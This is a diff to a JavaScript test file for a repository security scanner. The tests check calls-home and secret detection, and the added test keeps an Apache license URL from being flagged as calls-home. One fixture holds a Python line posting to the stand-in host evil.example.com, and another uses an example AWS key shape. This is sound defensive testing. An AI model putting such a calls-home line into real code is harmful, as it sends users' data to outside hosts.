@@ -40,6 +40,15 @@ test("analyzeRepo: blocks on exfiltration and flags calls-home to a non-allowlis
   assert.equal(findings.some((f) => f.rule === "calls-home" && /evil\.example\.com/.test(f.message)), true);
 });
 
+test("analyzeRepo: an Apache-license-header URL is NOT a calls-home finding, but a real host still is", () => {
+  const dir = repo({
+    "mod.py": "# Licensed under the Apache License, Version 2.0\n# http://www.apache.org/licenses/LICENSE-2.0\nimport requests\nrequests.post('https://evil.example.com/x')",
+  });
+  const { findings } = analyzeRepo(dir);
+  assert.equal(findings.some((f) => f.rule === "calls-home" && /apache\.org/.test(f.message)), false); // license boilerplate skipped
+  assert.equal(findings.some((f) => f.rule === "calls-home" && /evil\.example\.com/.test(f.message)), true); // real host still flagged
+});
+
 test("analyzeRepo §10: a block-class finding in a test/example path is downgraded to warn", () => {
   const key = "AKIAIOSFODNN7EXAMPLE"; // AWS key shape — a block-class finding
   const envEx = analyzeRepo(repo({ ".env.example": `AWS_KEY=${key}` }));
